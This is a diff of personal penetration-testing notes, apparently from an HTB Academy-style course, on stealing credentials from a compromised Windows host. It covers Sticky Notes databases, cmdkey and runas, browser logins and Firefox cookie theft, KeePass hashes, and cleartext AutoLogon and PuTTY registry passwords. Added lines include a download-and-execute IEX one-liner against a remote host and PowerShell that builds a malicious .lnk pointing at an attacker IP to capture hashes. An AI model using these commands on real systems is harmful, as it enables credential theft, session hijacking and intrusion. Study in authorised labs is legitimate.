@@ -135,7 +135,7 @@ C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8b
 
 * We can copy the three `plum.sqlite*` files down to our system and open them with a tool such as [DB Browser for SQLite](https://sqlitebrowser.org/dl/) and view the `Text` column in the `Note` table with the query `select Text from Note;`.
 
-!\[\[Pasted image 20240807175846.png]]
+![Pasted image 20240807175846.png](app://85fd2e08a2e02ee3466d9fd1853849432a14/E:/NATHANIEL%20DATA/Personal/OneDrive/obsidian/Alex/Alex/09-Attachments/Pasted%20image%2020240807175846.png?1723033726344)
 
 **Viewing Sticky Notes Data Using PowerShell**
 
@@ -199,49 +199,49 @@ C:\ProgramData\Configs\*
 C:\Program Files\Windows PowerShell\*
 ```
 
+
+
 ### Further Credential Theft
 
 #### Cmdkey Saved Credentials
 
-* The [cmdkey](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/cmdkey) command can be used to create, list, and delete stored usernames and passwords.
-* Users may wish to store credentials for a specific host or use it to store credentials for terminal services connections to connect to a remote host using Remote Desktop without needing to enter a password.
-* This may help us either move laterally to another system with a different user or escalate privileges on the current host to leverage stored credentials for another user.
+[cmdkey-saved-credentials.md](cmdkey-saved-credentials.md "mention")
 
-```cmd-session
-cmdkey /list
-```
 
-* We can also attempt to reuse the credentials using `runas` to send ourselves a reverse shell as that user, run a binary, or launch a PowerShell or CMD console with a command such as:
-
-**Run Commands as Another User**
-
-```powershell-session
-runas /savecred /user:inlanefreight\bob "COMMAND HERE"
-```
 
 ### Browser Credentials
 
 **Retrieving Saved Credentials from Chrome**
 
-* Users often store credentials in their browsers for applications that they frequently visit.
-  * We can use a tool such as [SharpChrome](https://github.com/GhostPack/SharpDPAPI) to retrieve cookies and saved logins from Google Chrome.
+[retrieving-saved-credentials-from-chrome-windows.md](retrieving-saved-credentials-from-chrome-windows.md "mention")
+
+
+
+#### Copy Firefox Cookies Database
 
 ```powershell-session
-.\SharpChrome.exe logins /unprotect
+copy $env:APPDATA\Mozilla\Firefox\Profiles\*.default-release\cookies.sqlite .
+```
+
+* We can copy the file to our machine and use the Python script [cookieextractor.py](https://raw.githubusercontent.com/juliourena/plaintext/master/Scripts/cookieextractor.py) to extract cookies from the Firefox cookies.SQLite database.
+
+```shell-session
+python3 cookieextractor.py --dbpath "/home/plaintext/cookies.sqlite" --host slack --cookie d
 ```
 
 ### Password Managers
 
 **Extracting KeePass Hash**
 
-```shell-session
-python2.7 keepass2john.py ILFREIGHT_Help_Desk.kdbx 
-```
+[extracting-keepass-hash.md](extracting-keepass-hash.md "mention")
 
 **Cracking Hash Offline**
 
-* \[\[Online Hash Crackers]]
-* \[\[Hashcat]]
+[online-hash-crackers.md](online-hash-crackers.md "mention")
+
+[hashcat.md](hashcat.md "mention")
+
+
 
 ### Email
 
@@ -250,103 +250,133 @@ python2.7 keepass2john.py ILFREIGHT_Help_Desk.kdbx
 
 ### When all else fails
 
-* &#x20;run the \[\[laZagne]] tool in an attempt to retrieve credentials from a wide variety of software
-* \[\[SessionGopher]]
+* &#x20;run the [laZagne](app://obsidian.md/laZagne) tool in an attempt to retrieve credentials from a wide variety of software
+* [SessionGopher](app://obsidian.md/SessionGopher)
 
-### Clear-Text Password Storage in the Registry
 
-#### Windows AutoLogon
-
-* Windows [Autologon](https://learn.microsoft.com/en-us/troubleshoot/windows-server/user-profiles-and-logon/turn-on-automatic-logon) is a feature that allows a user to configure their Windows operating system to automatically log on to a specific user account, without requiring manual input of the username and password at each startup.
-* However, once this is configured, the username and password are stored in the registry, in clear-text.
-  * This feature is commonly used on single-user systems or in situations where convenience outweighs the need for enhanced security
-* The registry keys associated with Autologon can be found under `HKEY_LOCAL_MACHINE` in the following hive, and can be accessed by standard users:
-
-```cmd
-HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon
-```
-
-* The typical configuration of an Autologon account involves the manual setting of the following registry keys:
-  * `AdminAutoLogon` - Determines whether Autologon is enabled or disabled. A value of "1" means it is enabled.
-  * `DefaultUserName` - Holds the value of the username of the account that will automatically log on.
-  * `DefaultPassword` - Holds the value of the password for the user account specified previously.
-
-**Enumerating Autologon with reg.exe**
-
-```cmd-session
-reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
-```
-
-```cmd-session
-
-HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon
-    AutoRestartShell    REG_DWORD    0x1
-    Background    REG_SZ    0 0 0
-    
-    <SNIP>
-    
-    AutoAdminLogon    REG_SZ    1
-    DefaultUserName    REG_SZ    htb-student
-    DefaultPassword    REG_SZ    HTB_@cademy_stdnt!
-```
-
-* **`Note:`** If you absolutely must configure Autologon for your windows system, it is recommended to use Autologon.exe from the Sysinternals suite, which will encrypt the password as an LSA secret.
-
-#### Putty
-
-* For Putty sessions utilizing a proxy connection, when the session is saved, the credentials are stored in the registry in clear text.
-
-```
-Computer\HKEY_CURRENT_USER\SOFTWARE\SimonTatham\PuTTY\Sessions\<SESSION NAME>
-```
-
-* Note that the access controls for this specific registry key are tied to the user account that configured and saved the session.
-* Therefore, in order to see it, we would need to be logged in as that user and search the `HKEY_CURRENT_USER` hive.
-* Subsequently, if we had admin privileges, we would be able to find it under the corresponding user's hive in `HKEY_USERS`.
-
-**Enumerating Sessions and Finding Credentials:**
-
-```powershell-session
-reg query HKEY_CURRENT_USER\SOFTWARE\SimonTatham\PuTTY\Sessions
-```
-
-```powershell-session
-HKEY_CURRENT_USER\SOFTWARE\SimonTatham\PuTTY\Sessions\kali%20ssh
-```
-
-* Next, we look at the keys and values of the discovered session "`kali%20ssh`":
-
-```powershell-session
-reg query HKEY_CURRENT_USER\SOFTWARE\SimonTatham\PuTTY\Sessions\kali%20ssh
-```
-
-```powershell-session
-HKEY_CURRENT_USER\SOFTWARE\SimonTatham\PuTTY\Sessions\kali%20ssh
-    Present    REG_DWORD    0x1
-    HostName    REG_SZ
-    LogFileName    REG_SZ    putty.log
-    
-  <SNIP>
-  
-    ProxyDNS    REG_DWORD    0x1
-    ProxyLocalhost    REG_DWORD    0x0
-    ProxyMethod    REG_DWORD    0x5
-    ProxyHost    REG_SZ    proxy
-    ProxyPort    REG_DWORD    0x50
-    ProxyUsername    REG_SZ    administrator
-    ProxyPassword    REG_SZ    1_4m_th3_@cademy_4dm1n!  
-```
 
 ### Wifi Passwords
 
-**Viewing Saved Wireless Networks**
+[extracting-windows-wifi-password.md](extracting-windows-wifi-password.md "mention")
 
-```cmd-session
-netsh wlan show profile
+
+
+### Citrix Breakout
+
+* [Citrix Breakout](app://obsidian.md/Citrix%20Breakout)
+
+### Traffic Capture
+
+* if wireshark or tcpdump is there you can use it to capture packets from another user
+
+### Monitoring for Process Command Lines
+
+* It captures process command lines every two seconds and compares the current state with the previous state, outputting any differences.
+* procmon.ps1
+
+```shell-session
+while($true)
+{
+
+  $process = Get-WmiObject Win32_Process | Select-Object CommandLine
+  Start-Sleep 1
+  $process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
+  Compare-Object -ReferenceObject $process -DifferenceObject $process2
+
+}
 ```
 
-**Retrieving Saved Wireless Passwords**
-
-```cmd-session
-netsh wlan show profile ilfreight_corp key=clear
+```powershell-session
+ IEX (iwr 'http://10.10.10.205/procmon.ps1') 
 ```
+
+### Search Windows Registry for key
+
+```
+# Download script
+curl https://raw.githubusercontent.com/KurtDeGreeff/PlayPowershell/master/Search-Registry.ps1 -OutFile Search-Registry.ps1
+
+# View docs
+Get-Help .\Search-Registry.ps1
+
+# Simple example (search HKEY_CURRENT_USER for values with data containing "powershell")
+.\Search-Registry -StartKey HKCU -Pattern "PowerShell" -MatchData
+```
+
+**Get Installed Programs via PowerShell & Registry Keys**
+
+```powershell-session
+$INSTALLED = Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* |  Select-Object DisplayName, DisplayVersion, InstallLocation
+$INSTALLED += Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion, InstallLocation
+$INSTALLED | ?{ $_.DisplayName -ne $null } | sort-object -Property DisplayName -Unique | Format-Table -AutoSize
+```
+
+### Capturing Hashes with a Malicious .lnk File
+
+* Using SCFs no longer works on Server 2019 hosts,
+  * but we can achieve the same effect using a malicious [.lnk](https://docs.microsoft.com/en-us/openspecs/windows\_protocols/ms-shllink/16cb4ca1-9339-4d0c-a68d-bf1d6cc0f943) file.
+* We can use various tools to generate a malicious .lnk file, such as [Lnkbomb](https://github.com/dievus/lnkbomb), as it is not as straightforward as creating a malicious .scf file.
+  * We can also make one using a few lines of PowerShell:
+
+**Generating a Malicious .lnk File**
+
+```powershell-session
+$objShell = New-Object -ComObject WScript.Shell
+$lnk = $objShell.CreateShortcut("C:\legit.lnk")
+$lnk.TargetPath = "\\<attackerIP>\@pwn.png"
+$lnk.WindowStyle = 1
+$lnk.IconLocation = "%windir%\system32\shell32.dll, 3"
+$lnk.Description = "Browsing to the directory where this file is saved will trigger an auth request."
+$lnk.HotKey = "Ctrl+Alt+O"
+$lnk.Save()
+```
+
+
+
+### Pillaging
+
+* Pillaging is the process of obtaining information from a compromised system.
+* It can be personal information, corporate blueprints, credit card data, server information, infrastructure and network details, passwords, or other types of credentials, and anything relevant to the company or security assessment we are working on.
+* Below are some of the sources from which we can obtain information from compromised systems:
+  * Installed applications
+  * Installed services
+    * Websites
+    * File Shares
+    * Databases
+    * Directory Services (such as Active Directory, Azure AD, etc.)
+    * Name Servers
+    * Deployment Services
+    * Certificate Authority
+    * Source Code Management Server
+    * Virtualization
+    * Messaging
+    * Monitoring and Logging Systems
+    * Backups
+  * Sensitive Data
+    * Keylogging
+    * Screen Capture
+    * Network Traffic Capture
+    * Previous Audit reports
+  * User Information
+    * History files, interesting documents (.doc/x,.xls/x,password._/pass._, etc)
+    * Roles and Privileges
+    * Web Browsers
+    * IM Clients
+
+#### Extracting Clipboard data
+
+[extracting-clipboard-data-windows.md](extracting-clipboard-data-windows.md "mention")
+
+
+
+### &#x20;Search entire windows for a file
+
+* cd to the directory you want to search in
+
+```
+ dir /s *confCons.xml* 
+```
+
+\
+
+
